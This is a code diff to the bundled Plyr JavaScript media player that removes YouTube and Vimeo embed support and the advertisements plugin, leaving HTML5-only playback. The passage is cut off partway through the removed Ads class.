@@ -1006,16 +1006,7 @@
             wrapper.style.paddingBottom = `${padding}%`;
         }
 
-        // For Vimeo we have an extra <div> to hide the standard controls and UI
-        if (this.isVimeo && !this.config.vimeo.premium && this.supported.ui) {
-            const height = 100 / this.media.offsetWidth * parseInt(window.getComputedStyle(this.media).paddingBottom, 10);
-            const offset = (height - padding) / (height / 50);
-            if (this.fullscreen.active) {
-                wrapper.style.paddingBottom = null;
-            } else {
-                this.media.style.transform = `translateY(-${offset}%)`;
-            }
-        } else if (this.isHTML5) {
+         if (this.isHTML5) {
             wrapper.classList.add(this.config.classNames.videoFixedRatio);
         }
         return {
@@ -1256,8 +1247,6 @@
         pip     : 'PIP',
         airplay : 'AirPlay',
         html5   : 'HTML5',
-        vimeo   : 'Vimeo',
-        youtube : 'YouTube'
     };
     const i18n = {
         get(key = '', config = {}) {
@@ -3091,8 +3080,8 @@
                 return;
             }
 
-            // Only Vimeo and HTML5 video supported at this point
-            if (!this.isVideo || this.isYouTube || this.isHTML5 && !support.textTracks) {
+            // Only  HTML5 video supported at this point
+            if (!this.isVideo || this.isHTML5 && !support.textTracks) {
                 // Clear menu and hide
                 if (is.array(this.config.controls) && this.config.controls.includes('settings') && this.config.settings.includes('captions')) {
                     controls.setCaptionsMenu.call(this);
@@ -3314,11 +3303,6 @@
                     });
                 }
 
-                // Handle Vimeo captions
-                if (this.isVimeo) {
-                    this.embed.enableTextTrack(language);
-                }
-
                 // Trigger event
                 triggerEvent.call(this, this.media, 'languagechange');
             }
@@ -3392,7 +3376,7 @@
             return i18n.get('disabled', this.config);
         },
         // Update captions using current track's active cues
-        // Also optional array argument in case there isn't any track (ex: vimeo)
+        // Also optional array argument in case there isn't any track
         updateCues(input) {
             // Requires UI
             if (!this.supported.ui) {
@@ -3445,7 +3429,7 @@
         debug              : false,
         // Auto play (if supported)
         autoplay           : false,
-        // Only allow one media playing at once (vimeo only)
+        // Only allow one media playing at once
         autopause          : true,
         // Allow inline playback on iOS
         playsinline        : true,
@@ -3498,7 +3482,7 @@
         // Speed default and options to display
         speed      : {
             selected : 1,
-            // The options to display in the UI, if available for the source media (e.g. Vimeo and YouTube only support 0.5x-4x)
+            // The options to display in the UI, if available for the source media
             options  : [0.5, 0.75, 1, 1.25, 1.5, 1.75, 2, 4]
         },
         // Keyboard shortcut settings
@@ -3597,18 +3581,6 @@
         // URLs
         urls              : {
             download  : null,
-            vimeo     : {
-                sdk    : 'https://player.vimeo.com/api/player.js',
-                iframe : 'https://player.vimeo.com/video/{0}?{1}',
-                api    : 'https://vimeo.com/api/oembed.json?url={0}'
-            },
-            youtube   : {
-                sdk : 'https://www.youtube.com/iframe_api',
-                api : 'https://noembed.com/embed?url=https://www.youtube.com/watch?v={0}'
-            },
-            googleIMA : {
-                sdk : 'https://imasdk.googleapis.com/js/sdkloader/ima3.js'
-            }
         },
         // Custom control listeners
         listeners         : {
@@ -3641,8 +3613,7 @@
             'statechange',
             // Quality
             'qualitychange',
-            // Ads
-            'adsloaded', 'adscontentpause', 'adscontentresume', 'adstarted', 'adsmidpoint', 'adscomplete', 'adsallcomplete', 'adsimpression', 'adsclick'],
+        ],
         // Selectors
         // Change these to match your template if using custom HTML
         selectors         : {
@@ -3697,7 +3668,6 @@
             embedContainer    : 'plyr__video-embed__container',
             poster            : 'plyr__poster',
             posterEnabled     : 'plyr__poster-enabled',
-            ads               : 'plyr__ads',
             control           : 'plyr__control',
             controlPressed    : 'plyr__control--pressed',
             playing           : 'plyr--playing',
@@ -3756,48 +3726,11 @@
                 hash     : 'data-plyr-embed-hash'
             }
         },
-        // Advertisements plugin
-        // Register for an account here: http://vi.ai/publisher-video-monetization/?aid=plyrio
-        ads               : {
-            enabled     : false,
-            publisherId : '',
-            tagUrl      : ''
-        },
         // Preview Thumbnails plugin
         previewThumbnails : {
             enabled : false,
             src     : ''
         },
-        // Vimeo plugin
-        vimeo             : {
-            byline         : false,
-            portrait       : false,
-            title          : false,
-            speed          : true,
-            transparent    : false,
-            // Custom settings from Plyr
-            customControls : true,
-            referrerPolicy : null,
-            // https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/referrerPolicy
-            // Whether the owner of the video has a Pro or Business account
-            // (which allows us to properly hide controls without CSS hacks, etc)
-            premium        : false
-        },
-        // YouTube plugin
-        youtube           : {
-            rel            : 0,
-            // No related vids
-            showinfo       : 0,
-            // Hide info
-            iv_load_policy : 3,
-            // Hide annotations
-            modestbranding : 1,
-            // Hide logos as much as possible (they still show one in the corner when paused)
-            // Custom settings from Plyr
-            customControls : true,
-            noCookie       : false // Whether to use an alternative version of YouTube without cookies
-        },
-
         // Media Metadata
         mediaMetadata : {
             title   : '',
@@ -3827,8 +3760,6 @@
 
     const providers = {
         html5   : 'html5',
-        youtube : 'youtube',
-        vimeo   : 'vimeo'
     };
     const types = {
         audio : 'audio',
@@ -3840,15 +3771,6 @@
      * @param {String} url
      */
     function getProviderByUrl(url) {
-        // YouTube
-        if (/^(https?:\/\/)?(www\.)?(youtube\.com|youtube-nocookie\.com|youtu\.?be)\/.+$/.test(url)) {
-            return providers.youtube;
-        }
-
-        // Vimeo
-        if (/^https?:\/\/player.vimeo.com\/video\/\d{0,9}(?=\b|\/)/.test(url)) {
-            return providers.vimeo;
-        }
         return null;
     }
 
@@ -3979,11 +3901,7 @@
 
                 // iOS native fullscreen doesn't need the request step
                 if (browser.isIos && this.player.config.fullscreen.iosNative) {
-                    if (this.player.isVimeo) {
-                        this.player.embed.requestFullscreen();
-                    } else {
                         this.target.webkitEnterFullscreen();
-                    }
                 } else if (!Fullscreen.nativeSupported || this.forceFallback) {
                     this.toggleFallback(true);
                 } else if (!this.prefix) {
@@ -4000,11 +3918,7 @@
 
                 // iOS native fullscreen
                 if (browser.isIos && this.player.config.fullscreen.iosNative) {
-                    if (this.player.isVimeo) {
-                        this.player.embed.exitFullscreen();
-                    } else {
                         this.target.webkitEnterFullscreen();
-                    }
                     silencePromise(this.player.play());
                 } else if (!Fullscreen.nativeSupported || this.forceFallback) {
                     this.toggleFallback(false);
@@ -4484,9 +4398,6 @@
 
                 // Set a gutter for Vimeo
                 const setGutter = () => {
-                    if (!player.isVimeo || player.config.vimeo.premium) {
-                        return;
-                    }
                     const target = elements.wrapper;
                     const {
                               active
@@ -5453,415 +5364,6 @@
         });
     }
 
-    // ==========================================================================
-
-    // Parse Vimeo ID from URL
-    function parseId$1(url) {
-        if (is.empty(url)) {
-            return null;
-        }
-        if (is.number(Number(url))) {
-            return url;
-        }
-        const regex = /^.*(vimeo.com\/|video\/)(\d+).*/;
-        return url.match(regex) ? RegExp.$2 : url;
-    }
-
-    // Try to extract a hash for private videos from the URL
-    function parseHash(url) {
-        /* This regex matches a hexadecimal hash if given in any of these forms:
-     *  - [https://player.]vimeo.com/video/{id}/{hash}[?params]
-     *  - [https://player.]vimeo.com/video/{id}?h={hash}[&params]
-     *  - [https://player.]vimeo.com/video/{id}?[params]&h={hash}
-     *  - video/{id}/{hash}
-     * If matched, the hash is available in capture group 4
-     */
-        const regex = /^.*(vimeo.com\/|video\/)(\d+)(\?.*&*h=|\/)+([\d,a-f]+)/;
-        const found = url.match(regex);
-        return found && found.length === 5 ? found[4] : null;
-    }
-
-    // Set playback state and trigger change (only on actual change)
-    function assurePlaybackState$1(play) {
-        if (play && !this.embed.hasPlayed) {
-            this.embed.hasPlayed = true;
-        }
-        if (this.media.paused === play) {
-            this.media.paused = !play;
-            triggerEvent.call(this, this.media, play ? 'play' : 'pause');
-        }
-    }
-
-    const vimeo = {
-        setup() {
-            const player = this;
-
-            // Add embed class for responsive
-            toggleClass(player.elements.wrapper, player.config.classNames.embed, true);
-
-            // Set speed options from config
-            player.options.speed = player.config.speed.options;
-
-            // Set intial ratio
-            setAspectRatio.call(player);
-
-            // Load the SDK if not already
-            if (!is.object(window.Vimeo)) {
-                loadScript(player.config.urls.vimeo.sdk).then(() => {
-                    vimeo.ready.call(player);
-                }).catch(error => {
-                    player.debug.warn('Vimeo SDK (player.js) failed to load', error);
-                });
-            } else {
-                vimeo.ready.call(player);
-            }
-        },
-        // API Ready
-        ready() {
-            const player = this;
-            const config = player.config.vimeo;
-            const {
-                      premium,
-                      referrerPolicy,
-                      ...frameParams
-                  } = config;
-            // Get the source URL or ID
-            let source = player.media.getAttribute('src');
-            let hash = '';
-            // Get from <div> if needed
-            if (is.empty(source)) {
-                source = player.media.getAttribute(player.config.attributes.embed.id);
-                // hash can also be set as attribute on the <div>
-                hash = player.media.getAttribute(player.config.attributes.embed.hash);
-            } else {
-                hash = parseHash(source);
-            }
-            const hashParam = hash ? {
-                h : hash
-            } : {};
-
-            // If the owner has a pro or premium account then we can hide controls etc
-            if (premium) {
-                Object.assign(frameParams, {
-                    controls : false,
-                    sidedock : false
-                });
-            }
-
-            // Get Vimeo params for the iframe
-            const params = buildUrlParams({
-                loop        : player.config.loop.active,
-                autoplay    : player.autoplay,
-                muted       : player.muted,
-                gesture     : 'media',
-                playsinline : player.config.playsinline,
-                // hash has to be added to iframe-URL
-                ...hashParam,
-                ...frameParams
-            });
-            const id = parseId$1(source);
-            // Build an iframe
-            const iframe = createElement('iframe');
-            const src = format(player.config.urls.vimeo.iframe, id, params);
-            iframe.setAttribute('src', src);
-            iframe.setAttribute('allowfullscreen', '');
-            iframe.setAttribute('allow', ['autoplay', 'fullscreen', 'picture-in-picture', 'encrypted-media', 'accelerometer', 'gyroscope'].join('; '));
-
-            // Set the referrer policy if required
-            if (!is.empty(referrerPolicy)) {
-                iframe.setAttribute('referrerPolicy', referrerPolicy);
-            }
-
-            // Inject the package
-            if (premium || !config.customControls) {
-                iframe.setAttribute('data-poster', player.poster);
-                player.media = replaceElement(iframe, player.media);
-            } else {
-                const wrapper = createElement('div', {
-                    class         : player.config.classNames.embedContainer,
-                    'data-poster' : player.poster
-                });
-                wrapper.appendChild(iframe);
-                player.media = replaceElement(wrapper, player.media);
-            }
-
-            // Get poster image
-            if (!config.customControls) {
-                fetch(format(player.config.urls.vimeo.api, src)).then(response => {
-                    if (is.empty(response) || !response.thumbnail_url) {
-                        return;
-                    }
-
-                    // Set and show poster
-                    ui.setPoster.call(player, response.thumbnail_url).catch(() => {
-                    });
-                });
-            }
-
-            // Setup instance
-            // https://github.com/vimeo/player.js
-            player.embed = new window.Vimeo.Player(iframe, {
-                autopause : player.config.autopause,
-                muted     : player.muted
-            });
-            player.media.paused = true;
-            player.media.currentTime = 0;
-
-            // Disable native text track rendering
-            if (player.supported.ui) {
-                player.embed.disableTextTrack();
-            }
-
-            // Create a faux HTML5 API using the Vimeo API
-            player.media.play = () => {
-                assurePlaybackState$1.call(player, true);
-                return player.embed.play();
-            };
-            player.media.pause = () => {
-                assurePlaybackState$1.call(player, false);
-                return player.embed.pause();
-            };
-            player.media.stop = () => {
-                player.pause();
-                player.currentTime = 0;
-            };
-
-            // Seeking
-            let {
-                    currentTime
-                } = player.media;
-            Object.defineProperty(player.media, 'currentTime', {
-                get() {
-                    return currentTime;
-                },
-                set(time) {
-                    // Vimeo will automatically play on seek if the video hasn't been played before
-
-                    // Get current paused state and volume etc
-                    const {
-                              embed,
-                              media,
-                              paused,
-                              volume
-                          } = player;
-                    const restorePause = paused && !embed.hasPlayed;
-
-                    // Set seeking state and trigger event
-                    media.seeking = true;
-                    triggerEvent.call(player, media, 'seeking');
-
-                    // If paused, mute until seek is complete
-                    Promise.resolve(restorePause && embed.setVolume(0))
-                        // Seek
-                        .then(() => embed.setCurrentTime(time))
-                        // Restore paused
-                        .then(() => restorePause && embed.pause())
-                        // Restore volume
-                        .then(() => restorePause && embed.setVolume(volume)).catch(() => {
-                        // Do nothing
-                    });
-                }
-            });
-
-            // Playback speed
-            let speed = player.config.speed.selected;
-            Object.defineProperty(player.media, 'playbackRate', {
-                get() {
-                    return speed;
-                },
-                set(input) {
-                    player.embed.setPlaybackRate(input).then(() => {
-                        speed = input;
-                        triggerEvent.call(player, player.media, 'ratechange');
-                    }).catch(() => {
-                        // Cannot set Playback Rate, Video is probably not on Pro account
-                        player.options.speed = [1];
-                    });
-                }
-            });
-
-            // Volume
-            let {
-                    volume
-                } = player.config;
-            Object.defineProperty(player.media, 'volume', {
-                get() {
-                    return volume;
-                },
-                set(input) {
-                    player.embed.setVolume(input).then(() => {
-                        volume = input;
-                        triggerEvent.call(player, player.media, 'volumechange');
-                    });
-                }
-            });
-
-            // Muted
-            let {
-                    muted
-                } = player.config;
-            Object.defineProperty(player.media, 'muted', {
-                get() {
-                    return muted;
-                },
-                set(input) {
-                    const toggle = is.boolean(input) ? input : false;
-                    player.embed.setMuted(toggle ? true : player.config.muted).then(() => {
-                        muted = toggle;
-                        triggerEvent.call(player, player.media, 'volumechange');
-                    });
-                }
-            });
-
-            // Loop
-            let {
-                    loop
-                } = player.config;
-            Object.defineProperty(player.media, 'loop', {
-                get() {
-                    return loop;
-                },
-                set(input) {
-                    const toggle = is.boolean(input) ? input : player.config.loop.active;
-                    player.embed.setLoop(toggle).then(() => {
-                        loop = toggle;
-                    });
-                }
-            });
-
-            // Source
-            let currentSrc;
-            player.embed.getVideoUrl().then(value => {
-                currentSrc = value;
-                controls.setDownloadUrl.call(player);
-            }).catch(error => {
-                this.debug.warn(error);
-            });
-            Object.defineProperty(player.media, 'currentSrc', {
-                get() {
-                    return currentSrc;
-                }
-            });
-
-            // Ended
-            Object.defineProperty(player.media, 'ended', {
-                get() {
-                    return player.currentTime === player.duration;
-                }
-            });
-
-            // Set aspect ratio based on video size
-            Promise.all([player.embed.getVideoWidth(), player.embed.getVideoHeight()]).then(dimensions => {
-                const [width, height] = dimensions;
-                player.embed.ratio = roundAspectRatio(width, height);
-                setAspectRatio.call(this);
-            });
-
-            // Set autopause
-            player.embed.setAutopause(player.config.autopause).then(state => {
-                player.config.autopause = state;
-            });
-
-            // Get title
-            player.embed.getVideoTitle().then(title => {
-                player.config.title = title;
-                ui.setTitle.call(this);
-            });
-
-            // Get current time
-            player.embed.getCurrentTime().then(value => {
-                currentTime = value;
-                triggerEvent.call(player, player.media, 'timeupdate');
-            });
-
-            // Get duration
-            player.embed.getDuration().then(value => {
-                player.media.duration = value;
-                triggerEvent.call(player, player.media, 'durationchange');
-            });
-
-            // Get captions
-            player.embed.getTextTracks().then(tracks => {
-                player.media.textTracks = tracks;
-                captions.setup.call(player);
-            });
-            player.embed.on('cuechange', ({
-                                              cues = []
-                                          }) => {
-                const strippedCues = cues.map(cue => stripHTML(cue.text));
-                captions.updateCues.call(player, strippedCues);
-            });
-            player.embed.on('loaded', () => {
-                // Assure state and events are updated on autoplay
-                player.embed.getPaused().then(paused => {
-                    assurePlaybackState$1.call(player, !paused);
-                    if (!paused) {
-                        triggerEvent.call(player, player.media, 'playing');
-                    }
-                });
-                if (is.element(player.embed.element) && player.supported.ui) {
-                    const frame = player.embed.element;
-
-                    // Fix keyboard focus issues
-                    // https://github.com/sampotts/plyr/issues/317
-                    frame.setAttribute('tabindex', -1);
-                }
-            });
-            player.embed.on('bufferstart', () => {
-                triggerEvent.call(player, player.media, 'waiting');
-            });
-            player.embed.on('bufferend', () => {
-                triggerEvent.call(player, player.media, 'playing');
-            });
-            player.embed.on('play', () => {
-                assurePlaybackState$1.call(player, true);
-                triggerEvent.call(player, player.media, 'playing');
-            });
-            player.embed.on('pause', () => {
-                assurePlaybackState$1.call(player, false);
-            });
-            player.embed.on('timeupdate', data => {
-                player.media.seeking = false;
-                currentTime = data.seconds;
-                triggerEvent.call(player, player.media, 'timeupdate');
-            });
-            player.embed.on('progress', data => {
-                player.media.buffered = data.percent;
-                triggerEvent.call(player, player.media, 'progress');
-
-                // Check all loaded
-                if (parseInt(data.percent, 10) === 1) {
-                    triggerEvent.call(player, player.media, 'canplaythrough');
-                }
-
-                // Get duration as if we do it before load, it gives an incorrect value
-                // https://github.com/sampotts/plyr/issues/891
-                player.embed.getDuration().then(value => {
-                    if (value !== player.media.duration) {
-                        player.media.duration = value;
-                        triggerEvent.call(player, player.media, 'durationchange');
-                    }
-                });
-            });
-            player.embed.on('seeked', () => {
-                player.media.seeking = false;
-                triggerEvent.call(player, player.media, 'seeked');
-            });
-            player.embed.on('ended', () => {
-                player.media.paused = true;
-                triggerEvent.call(player, player.media, 'ended');
-            });
-            player.embed.on('error', detail => {
-                player.media.error = detail;
-                triggerEvent.call(player, player.media, 'error');
-            });
-
-            // Rebuild UI
-            if (config.customControls) {
-                setTimeout(() => ui.build.call(player), 0);
-            }
-        }
-    };
 
     // ==========================================================================
 
@@ -5886,391 +5388,8 @@
     }
 
     function getHost(config) {
-        if (config.noCookie) {
-            return 'https://www.youtube-nocookie.com';
-        }
-        if (window.location.protocol === 'http:') {
-            return 'http://www.youtube.com';
-        }
-
-        // Use YouTube's default
         return undefined;
     }
-
-    const youtube = {
-        setup() {
-            // Add embed class for responsive
-            toggleClass(this.elements.wrapper, this.config.classNames.embed, true);
-
-            // Setup API
-            if (is.object(window.YT) && is.function(window.YT.Player)) {
-                youtube.ready.call(this);
-            } else {
-                // Reference current global callback
-                const callback = window.onYouTubeIframeAPIReady;
-
-                // Set callback to process queue
-                window.onYouTubeIframeAPIReady = () => {
-                    // Call global callback if set
-                    if (is.function(callback)) {
-                        callback();
-                    }
-                    youtube.ready.call(this);
-                };
-
-                // Load the SDK
-                loadScript(this.config.urls.youtube.sdk).catch(error => {
-                    this.debug.warn('YouTube API failed to load', error);
-                });
-            }
-        },
-        // Get the media title
-        getTitle(videoId) {
-            const url = format(this.config.urls.youtube.api, videoId);
-            fetch(url).then(data => {
-                if (is.object(data)) {
-                    const {
-                              title,
-                              height,
-                              width
-                          } = data;
-
-                    // Set title
-                    this.config.title = title;
-                    ui.setTitle.call(this);
-
-                    // Set aspect ratio
-                    this.embed.ratio = roundAspectRatio(width, height);
-                }
-                setAspectRatio.call(this);
-            }).catch(() => {
-                // Set aspect ratio
-                setAspectRatio.call(this);
-            });
-        },
-        // API ready
-        ready() {
-            const player = this;
-            const config = player.config.youtube;
-            // Ignore already setup (race condition)
-            const currentId = player.media && player.media.getAttribute('id');
-            if (!is.empty(currentId) && currentId.startsWith('youtube-')) {
-                return;
-            }
-
-            // Get the source URL or ID
-            let source = player.media.getAttribute('src');
-
-            // Get from <div> if needed
-            if (is.empty(source)) {
-                source = player.media.getAttribute(this.config.attributes.embed.id);
-            }
-
-            // Replace the <iframe> with a <div> due to YouTube API issues
-            const videoId = parseId(source);
-            const id = generateId(player.provider);
-            // Replace media element
-            const container = createElement('div', {
-                id,
-                'data-poster' : config.customControls ? player.poster : undefined
-            });
-            player.media = replaceElement(container, player.media);
-
-            // Only load the poster when using custom controls
-            if (config.customControls) {
-                const posterSrc = s => `https://i.ytimg.com/vi/${videoId}/${s}default.jpg`;
-
-                // Check thumbnail images in order of quality, but reject fallback thumbnails (120px wide)
-                loadImage(posterSrc('maxres'), 121) // Highest quality and un-padded
-                    .catch(() => loadImage(posterSrc('sd'), 121)) // 480p padded 4:3
-                    .catch(() => loadImage(posterSrc('hq'))) // 360p padded 4:3. Always exists
-                    .then(image => ui.setPoster.call(player, image.src)).then(src => {
-                    // If the image is padded, use background-size "cover" instead (like youtube does too with their posters)
-                    if (!src.includes('maxres')) {
-                        player.elements.poster.style.backgroundSize = 'cover';
-                    }
-                }).catch(() => {
-                });
-            }
-
-            // Setup instance
-            // https://developers.google.com/youtube/iframe_api_reference
-            player.embed = new window.YT.Player(player.media, {
-                videoId,
-                host       : getHost(config),
-                playerVars : extend({}, {
-                    // Autoplay
-                    autoplay        : player.config.autoplay ? 1 : 0,
-                    // iframe interface language
-                    hl              : player.config.hl,
-                    // Only show controls if not fully supported or opted out
-                    controls        : player.supported.ui && config.customControls ? 0 : 1,
-                    // Disable keyboard as we handle it
-                    disablekb       : 1,
-                    // Allow iOS inline playback
-                    playsinline     : player.config.playsinline && !player.config.fullscreen.iosNative ? 1 : 0,
-                    // Captions are flaky on YouTube
-                    cc_load_policy  : player.captions.active ? 1 : 0,
-                    cc_lang_pref    : player.config.captions.language,
-                    // Tracking for stats
-                    widget_referrer : window ? window.location.href : null
-                }, config),
-                events     : {
-                    onError(event) {
-                        // YouTube may fire onError twice, so only handle it once
-                        if (!player.media.error) {
-                            const code = event.data;
-                            // Messages copied from https://developers.google.com/youtube/iframe_api_reference#onError
-                            const message = {
-                                2   : 'The request contains an invalid parameter value. For example, this error occurs if you specify a video ID that does not have 11 characters, or if the video ID contains invalid characters, such as exclamation points or asterisks.',
-                                5   : 'The requested content cannot be played in an HTML5 player or another error related to the HTML5 player has occurred.',
-                                100 : 'The video requested was not found. This error occurs when a video has been removed (for any reason) or has been marked as private.',
-                                101 : 'The owner of the requested video does not allow it to be played in embedded players.',
-                                150 : 'The owner of the requested video does not allow it to be played in embedded players.'
-                            }[code] || 'An unknown error occurred';
-                            player.media.error = {
-                                code,
-                                message
-                            };
-                            triggerEvent.call(player, player.media, 'error');
-                        }
-                    },
-                    onPlaybackRateChange(event) {
-                        // Get the instance
-                        const instance = event.target;
-
-                        // Get current speed
-                        player.media.playbackRate = instance.getPlaybackRate();
-                        triggerEvent.call(player, player.media, 'ratechange');
-                    },
-                    onReady(event) {
-                        // Bail if onReady has already been called. See issue #1108
-                        if (is.function(player.media.play)) {
-                            return;
-                        }
-                        // Get the instance
-                        const instance = event.target;
-
-                        // Get the title
-                        youtube.getTitle.call(player, videoId);
-
-                        // Create a faux HTML5 API using the YouTube API
-                        player.media.play = () => {
-                            assurePlaybackState.call(player, true);
-                            instance.playVideo();
-                        };
-                        player.media.pause = () => {
-                            assurePlaybackState.call(player, false);
-                            instance.pauseVideo();
-                        };
-                        player.media.stop = () => {
-                            instance.stopVideo();
-                        };
-                        player.media.duration = instance.getDuration();
-                        player.media.paused = true;
-
-                        // Seeking
-                        player.media.currentTime = 0;
-                        Object.defineProperty(player.media, 'currentTime', {
-                            get() {
-                                return Number(instance.getCurrentTime());
-                            },
-                            set(time) {
-                                // If paused and never played, mute audio preventively (YouTube starts playing on seek if the video hasn't been played yet).
-                                if (player.paused && !player.embed.hasPlayed) {
-                                    player.embed.mute();
-                                }
-
-                                // Set seeking state and trigger event
-                                player.media.seeking = true;
-                                triggerEvent.call(player, player.media, 'seeking');
-
-                                // Seek after events sent
-                                instance.seekTo(time);
-                            }
-                        });
-
-                        // Playback speed
-                        Object.defineProperty(player.media, 'playbackRate', {
-                            get() {
-                                return instance.getPlaybackRate();
-                            },
-                            set(input) {
-                                instance.setPlaybackRate(input);
-                            }
-                        });
-
-                        // Volume
-                        let {
-                                volume
-                            } = player.config;
-                        Object.defineProperty(player.media, 'volume', {
-                            get() {
-                                return volume;
-                            },
-                            set(input) {
-                                volume = input;
-                                instance.setVolume(volume * 100);
-                                triggerEvent.call(player, player.media, 'volumechange');
-                            }
-                        });
-
-                        // Muted
-                        let {
-                                muted
-                            } = player.config;
-                        Object.defineProperty(player.media, 'muted', {
-                            get() {
-                                return muted;
-                            },
-                            set(input) {
-                                const toggle = is.boolean(input) ? input : muted;
-                                muted = toggle;
-                                instance[toggle ? 'mute' : 'unMute']();
-                                instance.setVolume(volume * 100);
-                                triggerEvent.call(player, player.media, 'volumechange');
-                            }
-                        });
-
-                        // Source
-                        Object.defineProperty(player.media, 'currentSrc', {
-                            get() {
-                                return instance.getVideoUrl();
-                            }
-                        });
-
-                        // Ended
-                        Object.defineProperty(player.media, 'ended', {
-                            get() {
-                                return player.currentTime === player.duration;
-                            }
-                        });
-
-                        // Get available speeds
-                        const speeds = instance.getAvailablePlaybackRates();
-                        // Filter based on config
-                        player.options.speed = speeds.filter(s => player.config.speed.options.includes(s));
-
-                        // Set the tabindex to avoid focus entering iframe
-                        if (player.supported.ui && config.customControls) {
-                            player.media.setAttribute('tabindex', -1);
-                        }
-                        triggerEvent.call(player, player.media, 'timeupdate');
-                        triggerEvent.call(player, player.media, 'durationchange');
-
-                        // Reset timer
-                        clearInterval(player.timers.buffering);
-
-                        // Setup buffering
-                        player.timers.buffering = setInterval(() => {
-                            // Get loaded % from YouTube
-                            player.media.buffered = instance.getVideoLoadedFraction();
-
-                            // Trigger progress only when we actually buffer something
-                            if (player.media.lastBuffered === null || player.media.lastBuffered < player.media.buffered) {
-                                triggerEvent.call(player, player.media, 'progress');
-                            }
-
-                            // Set last buffer point
-                            player.media.lastBuffered = player.media.buffered;
-
-                            // Bail if we're at 100%
-                            if (player.media.buffered === 1) {
-                                clearInterval(player.timers.buffering);
-
-                                // Trigger event
-                                triggerEvent.call(player, player.media, 'canplaythrough');
-                            }
-                        }, 200);
-
-                        // Rebuild UI
-                        if (config.customControls) {
-                            setTimeout(() => ui.build.call(player), 50);
-                        }
-                    },
-                    onStateChange(event) {
-                        // Get the instance
-                        const instance = event.target;
-
-                        // Reset timer
-                        clearInterval(player.timers.playing);
-                        const seeked = player.media.seeking && [1, 2].includes(event.data);
-                        if (seeked) {
-                            // Unset seeking and fire seeked event
-                            player.media.seeking = false;
-                            triggerEvent.call(player, player.media, 'seeked');
-                        }
-
-                        // Handle events
-                        // -1   Unstarted
-                        // 0    Ended
-                        // 1    Playing
-                        // 2    Paused
-                        // 3    Buffering
-                        // 5    Video cued
-                        switch (event.data) {
-                            case -1:
-                                // Update scrubber
-                                triggerEvent.call(player, player.media, 'timeupdate');
-
-                                // Get loaded % from YouTube
-                                player.media.buffered = instance.getVideoLoadedFraction();
-                                triggerEvent.call(player, player.media, 'progress');
-                                break;
-                            case 0:
-                                assurePlaybackState.call(player, false);
-
-                                // YouTube doesn't support loop for a single video, so mimick it.
-                                if (player.media.loop) {
-                                    // YouTube needs a call to `stopVideo` before playing again
-                                    instance.stopVideo();
-                                    instance.playVideo();
-                                } else {
-                                    triggerEvent.call(player, player.media, 'ended');
-                                }
-                                break;
-                            case 1:
-                                // Restore paused state (YouTube starts playing on seek if the video hasn't been played yet)
-                                if (config.customControls && !player.config.autoplay && player.media.paused && !player.embed.hasPlayed) {
-                                    player.media.pause();
-                                } else {
-                                    assurePlaybackState.call(player, true);
-                                    triggerEvent.call(player, player.media, 'playing');
-
-                                    // Poll to get playback progress
-                                    player.timers.playing = setInterval(() => {
-                                        triggerEvent.call(player, player.media, 'timeupdate');
-                                    }, 50);
-
-                                    // Check duration again due to YouTube bug
-                                    // https://github.com/sampotts/plyr/issues/374
-                                    // https://code.google.com/p/gdata-issues/issues/detail?id=8690
-                                    if (player.media.duration !== instance.getDuration()) {
-                                        player.media.duration = instance.getDuration();
-                                        triggerEvent.call(player, player.media, 'durationchange');
-                                    }
-                                }
-                                break;
-                            case 2:
-                                // Restore audio (YouTube starts playing on seek if the video hasn't been played yet)
-                                if (!player.muted) {
-                                    player.embed.unMute();
-                                }
-                                assurePlaybackState.call(player, false);
-                                break;
-                            case 3:
-                                // Trigger waiting event to add loading classes to container as the video buffers.
-                                triggerEvent.call(player, player.media, 'waiting');
-                                break;
-                        }
-                        triggerEvent.call(player, player.elements.container, 'statechange', false, {
-                            code : event.data
-                        });
-                    }
-                }
-            });
-        }
-    };
 
     // ==========================================================================
     const media = {
@@ -6312,10 +5431,6 @@
             }
             if (this.isHTML5) {
                 html5.setup.call(this);
-            } else if (this.isYouTube) {
-                youtube.setup.call(this);
-            } else if (this.isVimeo) {
-                vimeo.setup.call(this);
             }
         }
     };
@@ -6333,555 +5448,6 @@
         instance.elements.container.remove();
     };
 
-    class Ads {
-        /**
-         * Ads constructor.
-         * @param {Object} player
-         * @return {Ads}
-         */
-        constructor(player) {
-            /**
-             * Load the IMA SDK
-             */
-            _defineProperty$1(this, "load", () => {
-                if (!this.enabled) {
-                    return;
-                }
-
-                // Check if the Google IMA3 SDK is loaded or load it ourselves
-                if (!is.object(window.google) || !is.object(window.google.ima)) {
-                    loadScript(this.player.config.urls.googleIMA.sdk).then(() => {
-                        this.ready();
-                    }).catch(() => {
-                        // Script failed to load or is blocked
-                        this.trigger('error', new Error('Google IMA SDK failed to load'));
-                    });
-                } else {
-                    this.ready();
-                }
-            });
-            /**
-             * Get the ads instance ready
-             */
-            _defineProperty$1(this, "ready", () => {
-                // Double check we're enabled
-                if (!this.enabled) {
-                    destroy(this);
-                }
-
-                // Start ticking our safety timer. If the whole advertisement
-                // thing doesn't resolve within our set time; we bail
-                this.startSafetyTimer(12000, 'ready()');
-
-                // Clear the safety timer
-                this.managerPromise.then(() => {
-                    this.clearSafetyTimer('onAdsManagerLoaded()');
-                });
-
-                // Set listeners on the Plyr instance
-                this.listeners();
-
-                // Setup the IMA SDK
-                this.setupIMA();
-            });
-            /**
-             * In order for the SDK to display ads for our video, we need to tell it where to put them,
-             * so here we define our ad container. This div is set up to render on top of the video player.
-             * Using the code below, we tell the SDK to render ads within that div. We also provide a
-             * handle to the content video player - the SDK will poll the current time of our player to
-             * properly place mid-rolls. After we create the ad display container, we initialize it. On
-             * mobile devices, this initialization is done as the result of a user action.
-             */
-            _defineProperty$1(this, "setupIMA", () => {
-                // Create the container for our advertisements
-                this.elements.container = createElement('div', {
-                    class : this.player.config.classNames.ads
-                });
-                this.player.elements.container.appendChild(this.elements.container);
-
-                // So we can run VPAID2
-                google.ima.settings.setVpaidMode(google.ima.ImaSdkSettings.VpaidMode.ENABLED);
-
-                // Set language
-                google.ima.settings.setLocale(this.player.config.ads.language);
-
-                // Set playback for iOS10+
-                google.ima.settings.setDisableCustomPlaybackForIOS10Plus(this.player.config.playsinline);
-
-                // We assume the adContainer is the video container of the plyr element that will house the ads
-                this.elements.displayContainer = new google.ima.AdDisplayContainer(this.elements.container, this.player.media);
-
-                // Create ads loader
-                this.loader = new google.ima.AdsLoader(this.elements.displayContainer);
-
-                // Listen and respond to ads loaded and error events
